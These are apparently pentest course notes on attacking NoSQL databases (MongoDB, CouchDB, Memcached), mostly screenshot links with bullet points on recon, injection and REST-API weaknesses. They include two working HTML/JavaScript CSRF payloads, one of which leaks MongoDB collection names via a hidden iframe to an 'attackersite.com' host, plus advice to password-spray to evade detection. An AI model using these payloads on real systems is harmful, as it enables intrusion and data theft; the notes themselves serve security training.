![image-20210223093654778](images/image-20210223093654778.png)

---



[TOC]



### Introduction



> Different IT needs => different requirements and different business objectives and different budgets and different technologies

> NoSQL databases used by powerful organizations worldwide :
>
> 
>
> * **Mongo** => is being used by ADP, Cisco, Forbes, IBM and McAfee
> * **Couchbase** => is being used by BMW, U.S. Senate, Comcast and Starbucks
> * **Elasticsearch** => is being used by Github, Netflix and XING



![image-20210223100634206](images/image-20210223100634206.png)



![image-20210223100754561](images/image-20210223100754561.png)



* NoSQL => non SQL [also can be called Not Only SQL]
* NoSQL database is a **data-storing** and **data-retrieving** system that is modeled differently than the tabular (and relations-based) relational databases.
* ![image-20210223101124713](images/image-20210223101124713.png)
* NoSQL => open source license model,  but one can also come across commercial distributions.







![image-20210223101432928](images/image-20210223101432928.png)



* Simplicity ![image-20210223101604247](images/image-20210223101604247.png)
* Speed of Processing
* Scalability ![image-20210223101737153](images/image-20210223101737153.png)
* Ingestion that occurs at high rates
* Schema-free data models
* Complex object storing and processing





![image-20210223101956290](images/image-20210223101956290.png)





![image-20210223102037025](images/image-20210223102037025.png)





> Great Resource  => https://www.slideshare.net/felixgessert/nosql-data-stores-in-research-and-practice-icde-2016-tutorial-extended-version-75275720



![image-20210223102158819](images/image-20210223102158819.png)







* First identify => **NoSQL vendor and Version**
* Once the vendor and version are determined
  * then focus on to turn this information to  identifying vulnerabilities within the particular NoSQL version and the underlying source code
* Need to check for  *publicly known vulnerabilities related to that specific version*
* Also try to understand the source code by provoking error messages
  * Here proviking can be done by Fuzzing request components/parameter
* Need to do information gathering about various components of the NoSQL database.
* This Information Gathering include =>
  * enumerating user accounts
  * enumerating web server
  * enumerating NoSQL Database settings
  * enumerate common misconfigurations
  * enumerate URLs related to specific NoSQL databases => which might reveal effective attack paths.
* After Information Gathering phase , next phase will be => Exploitation Phase using information we gathered
* In case a NoSQL database is protected via an authentication mechanism, then try to
  * password spraying instead of  brute-force attacks 
  * so that to avoid detection
* If in-scope, we can also use a NoSQL database as an oracle, to identify valid user accounts on a system





![image-20210223103325219](images/image-20210223103325219.png)







---



### NoSQL Fundamentals & Security



![image-20210223103805874](images/image-20210223103805874.png)





* MongoDB => most widely-deployed NoSQL Database and also  leading Document (BSON-encoded) database.
* ![image-20210223104127755](images/image-20210223104127755.png)
* ![image-20210223104410386](images/image-20210223104410386.png)
* ![image-20210223110718528](images/image-20210223110718528.png)
* SQL logical commands are also mapped to MongoDB(JS), as follows.
  * ![image-20210223110909907](images/image-20210223110909907.png)
* ![image-20210223110942476](images/image-20210223110942476.png)
* ![image-20210223111021148](images/image-20210223111021148.png)
* ![image-20210223111103324](images/image-20210223111103324.png)
* ![image-20210223111156564](images/image-20210223111156564.png)



* MongoDB configuration file => **mongodb.conf or mongod.conf**
  * https://docs.mongodb.com/manual/reference/configuration-options/
  * It contains interesting information like
    * where the database files are located (dbpath option)
  * Analyzing a  MongoDB configuration file, may reveal new attack paths.





* ![image-20210223111423431](images/image-20210223111423431.png)

* ### MongoDB's Security Posture

  * MongoDB **doesn't provide** *authentication and access control*, **by default**
    * all resources are available from within an authenticated session
    * Both authentication and access control are supported and can be enabled though
    * **MongoDB's RBAC can be enabled via the *-auth flag* or via *security.authorization.***
      * Enabling RBAC will result in resources and actions being mapped to roles.
  * MongoDB **doesn't enforce** *TLS communications*, **by default.**
    * Communications over TLS are supported though
    * Configuring TLS **was added from version 3.0 onwards**
    * **MiTM attacks** are subsequently possible by an attacker at a privileged network position.
  * **Encryption**  for data at rest is also not provided, by default
    * It is supported though
    * Key management and the less secure option of a local keyfile are both supported to facilitate the encryption of data at rest.
  * By *default*, **the MongoDB service used to bind to all available interfaces**.
    * Not a good practice, if one considers to install MongoDB on a dual-homed machine for example
    * This behavior was then **altered** and the configuration file can be used to offer better isolation
      * https://www.mongodb.com/blog/post/update-how-to-avoid-a-malicious-attack-that-ransoms-your-data
    * **The old behavior can be met even today though,** due to poor security practices and quick-fixing methods.
  * ![image-20210223112214142](images/image-20210223112214142.png)
  * ![image-20210223112302993](images/image-20210223112302993.png)
  * ![image-20210223112354800](images/image-20210223112354800.png)
    * ![image-20210223112452570](images/image-20210223112452570.png)
    * ![image-20210223112525678](images/image-20210223112525678.png)
    * Default installation is very common
    * ![image-20210223112628888](images/image-20210223112628888.png)
    * ![image-20210223112652656](images/image-20210223112652656.png)
    * ![image-20210223112714134](images/image-20210223112714134.png)

* ![image-20210223112816143](images/image-20210223112816143.png)





* Great Talk => http://blog.ptsecurity.com/2012/11/attacking-mongodb.html











![image-20210223113050144](images/image-20210223113050144.png)





* Metasploit Scanner => https://www.rapid7.com/db/modules/auxiliary/scanner/mongodb/mongodb_login
  * This scanner is good for checking passwords, when authentication is enabled
  * Don't offer much regarding default behavior like password-less access
  * Can use script => https://www.trustwave.com/resources/spiderlabs-blog/mongodb---security-weaknesses-in-a-typical-nosql-database/

















![image-20210223113351944](images/image-20210223113351944.png)





![image-20210223113438795](images/image-20210223113438795.png)





* ![image-20210223113502597](images/image-20210223113502597.png)
* ![image-20210223113522997](images/image-20210223113522997.png)
* ![image-20210223113538389](images/image-20210223113538389.png)







![image-20210223113617831](images/image-20210223113617831.png)





* ### CouchDB's Security Posture

  * ![image-20210223113720462](images/image-20210223113720462.png)
  * ![image-20210223113916193](images/image-20210223113916193.png)
  * CVE => https://bugzilla.redhat.com/show_bug.cgi?id=1516979   [CVE-2017-12635]
    * contains some CouchDB internals
    * https://justi.cz/security/2017/11/14/couchdb-rce-npm.html











![image-20210223114140734](images/image-20210223114140734.png)





* Real life exploitation example
* Suppose we have en endpoint  = **search.php**
  * providing search functionality
* Its default error message is **"Error: Document ID is empty (errcode=0)"**
* So, it will telling that  this is a NoSQL Document Store database in the backend.
* If we try to search for something we know it doesn’t exist in the database, we get the following.
  * ![image-20210223114519506](images/image-20210223114519506.png)
* ![image-20210223114758767](images/image-20210223114758767.png)
* ![image-20210223114841329](images/image-20210223114841329.png)
* ![image-20210223114941139](images/image-20210223114941139.png)
* ![image-20210223115045697](images/image-20210223115045697.png)

















![image-20210223115217406](images/image-20210223115217406.png)









![image-20210223115856185](images/image-20210223115856185.png)



* ![image-20210223115453903](images/image-20210223115453903.png)
* ![image-20210223115701430](images/image-20210223115701430.png)







![image-20210223120051786](images/image-20210223120051786.png)



* ![image-20210223120128335](images/image-20210223120128335.png)
* ![image-20210223120404447](images/image-20210223120404447.png)
* ![image-20210223120503842](images/image-20210223120503842.png)
* ![image-20210223120704834](images/image-20210223120704834.png)
* ![image-20210223120816199](images/image-20210223120816199.png)
* ![image-20210223120939431](images/image-20210223120939431.png)

















![image-20210223121107030](images/image-20210223121107030.png)



![image-20210223121124529](images/image-20210223121124529.png)



![image-20210223121233329](images/image-20210223121233329.png)





![image-20210223121434744](images/image-20210223121434744.png)







![image-20210223121732127](images/image-20210223121732127.png)



* ![image-20210223121807719](images/image-20210223121807719.png)
* ![image-20210223121902075](images/image-20210223121902075.png)
* ![image-20210223121927880](images/image-20210223121927880.png)
* ![image-20210223122040706](images/image-20210223122040706.png)
  * http://niiconsulting.com/checkmate/2013/05/memcache-exploit/





![image-20210223122233119](images/image-20210223122233119.png)



* Let's , we identified   an exposed Memcached server running at **port 11211.**
* Then, next => First interact with it 
  * ![image-20210223122350326](images/image-20210223122350326.png)
* ![image-20210223122535678](images/image-20210223122535678.png)
* ![image-20210223122633873](images/image-20210223122633873.png)
* ![image-20210223122717803](images/image-20210223122717803.png)
* ![image-20210223122737145](images/image-20210223122737145.png)
* ![image-20210223122922606](images/image-20210223122922606.png)
* ![image-20210223122946105](images/image-20210223122946105.png)
* ![image-20210223123007488](images/image-20210223123007488.png)
* ![image-20210223123032244](images/image-20210223123032244.png)
* ![image-20210223123056378](images/image-20210223123056378.png)
* ![image-20210223123124775](images/image-20210223123124775.png)
* ![image-20210223123229702](images/image-20210223123229702.png)
* ![image-20210223123302554](images/image-20210223123302554.png)
* ![image-20210223123454489](images/image-20210223123454489.png)
* ![image-20210223123642289](images/image-20210223123642289.png)





















![image-20210223144923628](images/image-20210223144923628.png)



![image-20210223144939650](images/image-20210223144939650.png)





![image-20210223145012795](images/image-20210223145012795.png)







![image-20210223145038293](images/image-20210223145038293.png)







![image-20210223145058040](images/image-20210223145058040.png)



* ![image-20210223145115354](images/image-20210223145115354.png)
* ![image-20210223145128917](images/image-20210223145128917.png)
* ![image-20210223145207594](images/image-20210223145207594.png)
* ![image-20210223145233793](images/image-20210223145233793.png)
* ![image-20210223145310611](images/image-20210223145310611.png)
* ![image-20210223145348253](images/image-20210223145348253.png)
* ![image-20210223145418970](images/image-20210223145418970.png)
* ![image-20210223145453001](images/image-20210223145453001.png)
* ![image-20210223145518496](images/image-20210223145518496.png)







---



### NoSQL Exploitation





* ![image-20210223145618436](images/image-20210223145618436.png)
* ![image-20210223145654197](images/image-20210223145654197.png)





![image-20210223145743812](images/image-20210223145743812.png)





* Unfortunately, there is such a thing as NoSQL injection. The root cause of NoSQL injection is:

  * NoSQL is more than **"key-value"** pairs.
  * Some of the **NoSQL** databases, have to deal with values that are actually very complex data types, like JSON.
  * **Parsing or deserializing**  such data can cause isssues

* ### Examples 1 =>

  * ![image-20210223150102022](images/image-20210223150102022.png)
  * ![image-20210223150145690](images/image-20210223150145690.png)
  * ![image-20210223150229843](images/image-20210223150229843.png)
  * ![image-20210223150319808](images/image-20210223150319808.png)
  * ![image-20210223150416961](images/image-20210223150416961.png)





* ### Example 2 =>

  * ![image-20210223150506187](images/image-20210223150506187.png)
  * ![image-20210223150611117](images/image-20210223150611117.png)
  * ![image-20210223150708947](images/image-20210223150708947.png)
  * ![image-20210223150743043](images/image-20210223150743043.png)
  * ![image-20210223150906539](images/image-20210223150906539.png)









![image-20210223150955396](images/image-20210223150955396.png)





* Great resource => https://arxiv.org/ftp/arxiv/papers/1506/1506.04082.pdf
* For NoSQL Databases , we need to know about the *concept of drivers*
* **Access to a NoSQL database is achieved through a *driver*.**
* **A driver**, 
  * wraps around protocols and provides libraries to a number of different NoSQL database clients in a multitude of language
* ![image-20210223151203245](images/image-20210223151203245.png)
* ![image-20210223151247803](images/image-20210223151247803.png)
* ![image-20210223151349807](images/image-20210223151349807.png)
* ![image-20210223151419523](images/image-20210223151419523.png)
* ![image-20210223151519885](images/image-20210223151519885.png)
* ![image-20210223151551357](images/image-20210223151551357.png)







> Let's go through each NoSQL attack category.

> Suppose we have a **MongoDB database** and the following insert statement and query.



```
db.articles.insert({ title: 'Hacking the grid', author: 'Hacker X' })

db.articles.find({ title: 'Hacking the grid' })
```









![image-20210223151749964](images/image-20210223151749964.png)





![image-20210223151829934](images/image-20210223151829934.png)





* ![image-20210223152004030](images/image-20210223152004030.png)
* ![image-20210223152203633](images/image-20210223152203633.png)
* ![image-20210223152300864](images/image-20210223152300864.png)
* ![image-20210223152414622](images/image-20210223152414622.png)
* ![image-20210223152448428](images/image-20210223152448428.png)
* ![image-20210223152522282](images/image-20210223152522282.png)











![image-20210223152552027](images/image-20210223152552027.png)







![image-20210223152626051](images/image-20210223152626051.png)





* ![image-20210223152719737](images/image-20210223152719737.png)
* ![image-20210223152904983](images/image-20210223152904983.png)
* ![image-20210223153125322](images/image-20210223153125322.png)
* ![image-20210223153217730](images/image-20210223153217730.png)







![image-20210223153252572](images/image-20210223153252572.png)





![image-20210223153402264](images/image-20210223153402264.png)







* ![image-20210223153511685](images/image-20210223153511685.png)
* ![image-20210223153606048](images/image-20210223153606048.png)
* ![image-20210223153650917](images/image-20210223153650917.png)
* ![image-20210223153831133](images/image-20210223153831133.png)
* ![image-20210223153912166](images/image-20210223153912166.png)
* ![image-20210223153942598](images/image-20210223153942598.png)
* ![image-20210223154006078](images/image-20210223154006078.png)









![image-20210223154044897](images/image-20210223154044897.png)







![image-20210223154104387](images/image-20210223154104387.png)





* ![image-20210223154159361](images/image-20210223154159361.png)
* ![image-20210223154227584](images/image-20210223154227584.png)
* ![image-20210223154257825](images/image-20210223154257825.png)
* ![image-20210223154341530](images/image-20210223154341530.png)
* ![image-20210223154713295](images/image-20210223154713295.png)
* ![image-20210223154938984](images/image-20210223154938984.png)
  * http://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf
* ![image-20210223155427219](images/image-20210223155427219.png)
* ![image-20210223155533595](images/image-20210223155533595.png)
* ![image-20210223155704442](images/image-20210223155704442.png)







![image-20210223155727556](images/image-20210223155727556.png)





> Let's now see a real-life Piggybacked Query attack.



```
Suppose we are performing a penetration test against a given application.

It is common to practice to FUZZ all the available pieces of a request.

We can try NoSQL injection payloads
```



* ![image-20210223160344325](images/image-20210223160344325.png)
* ![image-20210223160433571](images/image-20210223160433571.png)
* ![image-20210223160532757](images/image-20210223160532757.png)
* ![image-20210223160640492](images/image-20210223160640492.png)
* ![image-20210223160825962](images/image-20210223160825962.png)
* ![image-20210223160944668](images/image-20210223160944668.png)
* ![image-20210223161031273](images/image-20210223161031273.png)





> Great Resource for Memcached Injection =>
>
>
> https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf



![image-20210223161149960](images/image-20210223161149960.png)











![image-20210223161319006](images/image-20210223161319006.png)





![image-20210223161407334](images/image-20210223161407334.png)





![image-20210223161651531](images/image-20210223161651531.png)







![image-20210223161920689](images/image-20210223161920689.png)







![image-20210223162021099](images/image-20210223162021099.png)



![image-20210223162054776](images/image-20210223162054776.png)



> https://github.com/mongodb-labs/sleepy.mongoose



* ![image-20210223162233664](images/image-20210223162233664.png)
* ![image-20210223162305388](images/image-20210223162305388.png)
* ![image-20210223162324471](images/image-20210223162324471.png)
* ![image-20210223162349064](images/image-20210223162349064.png)







![image-20210223162419572](images/image-20210223162419572.png)







* Previous example attack works but still not much helpful for pentester as that attack will not give anything useful
  * Why ? => Because of  Same Origin Policy,
    * that forbids the reading of responses in the case of cross-origin requests.
* Suppose we have Mongo database (with its REST API enabled), residing in a corporation’s intranet, behind a firewall.
* There is a number of techniques, using which we can exfiltrate data after we attack the REST API, bypassing the Same Origin Policy





![image-20210223162704519](images/image-20210223162704519.png)





* This CSRF-based attack, is executed through an attacker controlled website featuring the following JavaScript code.

* ![image-20210223162751281](images/image-20210223162751281.png)

* ![image-20210223162823318](images/image-20210223162823318.png)

* ![image-20210223162850127](images/image-20210223162850127.png)

* ![image-20210223162938889](images/image-20210223162938889.png)

* ![image-20210223163002900](images/image-20210223163002900.png)

* ![image-20210223163027830](images/image-20210223163027830.png)

* ```
  <html>
  <body>
  <div>
  To check IP <input value = "127.0.0.1" id = "ip"> for version
  <select id = "version">
  <option value = "2">2</option>
  <option value = "3">3</option>
  </select>
  click on <button onclick = "check()">check</button>
  </div>
  <script>
  function check() {
  target_ip = document.getElementById('ip').value
  console.log(target_ip);
  version = document.getElementById('version').value
  first_date = Date.now()
  attack_iframe = document.createElement('iframe');
  document.body.appendChild(attack_iframe);
  attack_iframe.style = "visibility:hidden;";
  attack_iframe.onload = function(){
  second_date = Date.now()
  time = second_date-first_date;
  console.log(time)
  if(time > 2000) {
  alert('Possible match.\nThere might be mongodb '+version+'.x on IP '+target_ip+'\nPlease consider to deactivate it as database commands can be issued even if it\'s just a testing environment.') }
  else {
  alert('There is either no mongodb running on '+target_ip+',\nit wasn\'t started with --rest,\na different port is used\nor another problem occurred') } }
  url = 'http://'+target_ip+':28017/admin/$cmd/?filter_eval=function(){if(db.version().charAt(0)=='+version+'){sleep(2000)}}&limit=1';
  console.log(url);
  attack_iframe.src=url; }
  </script>
  </body>
  </html>
  ```

  





![image-20210223163141770](images/image-20210223163141770.png)





* ![image-20210223163253254](images/image-20210223163253254.png)

* ![image-20210223163311745](images/image-20210223163311745.png)

* ![image-20210223163328438](images/image-20210223163328438.png)

* ![image-20210223163417551](images/image-20210223163417551.png)

* ```
  <html>
  Remote host collection cloning
  <head>
  from the specified host.
  <title>Tempting Title</title>
  </head>
  <body>
  <textarea></textarea>
  <iframe src =
  'http://127.0.0.1:28017/test/$cmd/?filter_eval=ret="collections_";db.getCollectionNames().forEach(function(x){ret=ret%2bx%2b"."});{db.runCommand({cloneC
  ollection:"",from:ret%2b"version_."%2bdb.version()%2b".attackersite.com:27017",query:{}})}&limit=1' style = "visibility: hidden"></iframe>
  </body>
  </html>
  ```





![image-20210223163454646](images/image-20210223163454646.png)





![image-20210223164115078](images/image-20210223164115078.png)



![image-20210223164133912](images/image-20210223164133912.png)



![image-20210223164201003](images/image-20210223164201003.png)













![image-20210223164238559](images/image-20210223164238559.png)





![image-20210223164326144](images/image-20210223164326144.png)







* ### NoSQL Injection In MEAN Stack Applications

  * > Let's see some examples

  * ![image-20210223164447776](images/image-20210223164447776.png)

  * ![image-20210223164553296](images/image-20210223164553296.png)

  * ![image-20210223164618912](images/image-20210223164618912.png)

  * ![image-20210223164710929](images/image-20210223164710929.png)

  * ![image-20210223164729156](images/image-20210223164729156.png)

  * ![image-20210223164807886](images/image-20210223164807886.png)

  * ![image-20210223164833519](images/image-20210223164833519.png)

  * ![image-20210223164855032](images/image-20210223164855032.png)





---

